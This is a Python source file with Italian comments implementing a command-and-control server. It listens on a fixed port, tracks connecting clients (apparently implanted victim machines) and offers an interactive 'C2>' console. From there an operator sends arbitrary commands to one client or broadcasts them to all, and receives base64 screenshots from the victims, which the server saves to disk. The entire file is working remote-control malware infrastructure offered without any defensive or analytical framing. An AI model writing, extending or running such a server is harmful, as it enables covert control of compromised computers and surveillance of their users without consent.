#!/usr/bin/env python3
import socket
import threading
import sys
import time
import base64
import os

# Config
BIND_IP = '192.168.1.6'   # cambia se necessario
BIND_PORT = 5666

clients = {}   # cid -> socket
client_threads = {}
client_id_counter = 0
lock = threading.Lock()


def recv_exact(sock, n):
    """Ricevi esattamente n byte (o ritorna None se connessione chiusa)."""
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def handle_client(client_socket, client_address, cid):
    """Gestisce la singola connessione client."""
    print(f"[+] New connection: ID {cid} from {client_address}")
    with lock:
        clients[cid] = client_socket

    try:
        while True:
            # Leggi possibile header: proviamo a leggere fino al primo newline senza bloccare troppo
            # Per semplicità: leggiamo inizialmente un buffer e controlliamo se inizia con SCREENSHOT|
            # Se no, trattiamo il chunk come normale output testuale.
            data = client_socket.recv(4096)
            if not data:
                break

            try:
                text = data.decode('utf-8', errors='ignore')
            except Exception:
                text = ''

            # Caso screenshot: client invia header "SCREENSHOT|<length>\n" seguito dai <length> bytes (base64)
            if text.startswith("SCREENSHOT|"):
                # Potrebbe essere che non abbiamo ricevuto tutto l'header nel primo recv (raro se header piccolo),
                # quindi assicuriamoci di avere la linea completa.
                # Accumula fino al newline:
                buffer = data
                while b'\n' not in buffer:
                    more = client_socket.recv(4096)
                    if not more:
                        break
                    buffer += more

                # split header e rimanente
                try:
                    header, rest = buffer.split(b'\n', 1)
                    header_str = header.decode('utf-8', errors='ignore')
                    # header_str dovrebbe essere "SCREENSHOT|<length>"
                    _, length_str = header_str.split("|", 1)
                    length = int(length_str)
                except Exception as e:
                    print(f"[!] Malformed screenshot header from ID {cid}: {e}")
                    continue

                # rest contiene parte (o niente) dei dati base64; abbiamo bisogno di leggere remaining = length - len(rest)
                rest_len = len(rest)
                if rest_len >= length:
                    base64_bytes = rest[:length]
                    extra = rest[length:]  # dati in eccesso (potrebbero essere output successivo)
                else:
                    parts = [rest]
                    remaining = length - rest_len
                    more = recv_exact(client_socket, remaining)
                    if more is None:
                        print(f"[!] Connection closed while receiving screenshot from ID {cid}")
                        break
                    parts.append(more)
                    base64_bytes = b''.join(parts)
                    extra = b''

                # salva immagine
                try:
                    encoded_str = base64_bytes.decode('utf-8', errors='ignore')
                    img_bytes = base64.b64decode(encoded_str)
                    filename = f"screenshot_ID{cid}_{int(time.time())}.png"
                    with open(filename, "wb") as f:
                        f.write(img_bytes)
                    print(f"[*] Screenshot ricevuto da ID {cid} salvato come {filename}")
                except Exception as e:
                    print(f"[!] Errore nel decodificare/salvare screenshot da ID {cid}: {e}")

                # Se 'extra' contiene dati utili (testo), stampali
                if extra:
                    try:
                        extra_text = extra.decode('utf-8', errors='ignore').strip()
                        if extra_text:
                            print(f"[ID {cid}] (additional): {extra_text}")
                    except Exception:
                        pass

            else:
                # Non è uno screenshot: trattalo come output testuale
                text_clean = text.strip()
                if text_clean:
                    print(f"[ID {cid}] Response: {text_clean}")

    except Exception as e:
        print(f"[!] Error with client ID {cid}: {e}")
    finally:
        with lock:
            if cid in clients:
                del clients[cid]
        try:
            client_socket.close()
        except Exception:
            pass
        print(f"[-] Client ID {cid} disconnected")


def broadcast_command(command):
    """Invia il comando a tutti i client connessi."""
    with lock:
        for cid, client_socket in list(clients.items()):
            try:
                client_socket.send(command.encode('utf-8'))
                print(f"[*] Sent command to ID {cid}")
            except Exception as e:
                print(f"[!] Error sending to ID {cid}: {e}")


def send_command_to_client(cid, command):
    """Invia il comando a uno specifico client."""
    with lock:
        if cid in clients:
            try:
                clients[cid].send(command.encode('utf-8'))
                print(f"[*] Sent command to ID {cid}")
            except Exception as e:
                print(f"[!] Error sending to ID {cid}: {e}")
        else:
            print(f"[!] Client ID {cid} not found")


def list_sessions():
    """Stampa le sessioni attive."""
    with lock:
        if not clients:
            print("[!] No active sessions")
        else:
            print("[*] Active sessions:")
            for cid in clients:
                print(f" ID {cid}")


def server_shell():
    """Shell interattiva per il server."""
    while True:
        try:
            cmd = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Exiting shell")
            os._exit(0)

        if cmd == "sessions":
            list_sessions()

        elif cmd.startswith("interact"):
            try:
                parts = cmd.split()
                cid = int(parts[1])
                if cid in clients:
                    print(f"[*] Interacting with ID {cid}. Type 'background' to exit.")
                    while True:
                        try:
                            sub_cmd = input(f"ID {cid}> ").strip()
                        except (EOFError, KeyboardInterrupt):
                            break
                        if sub_cmd == "background":
                            break
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"[!] Client ID {cid} not found")
            except (IndexError, ValueError):
                print("[!] Usage: interact <client_id>")

        elif cmd.startswith("broadcast "):
            command = cmd[10:].strip()
            if command:
                broadcast_command(command)
            else:
                print("[!] Usage: broadcast <command>")

        elif cmd == "exit":
            with lock:
                for client_socket in clients.values():
                    try:
                        client_socket.close()
                    except Exception:
                        pass
            sys.exit(0)

        else:
            print("[!] Commands: sessions, interact <id>, broadcast <cmd>, exit")


def main():
    global client_id_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(10)
    print(f"[*] C2 Server started on {BIND_IP}:{BIND_PORT}")

    # Start shell thread
    threading.Thread(target=server_shell, daemon=True).start()

    try:
        while True:
            client_socket, client_address = server.accept()
            with lock:
                client_id_counter += 1
                cid = client_id_counter
            t = threading.Thread(target=handle_client, args=(client_socket, client_address, cid), daemon=True)
            t.start()
            client_threads[cid] = t
    except KeyboardInterrupt:
        print("\n[!] Shutting down server")
    finally:
        try:
            server.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
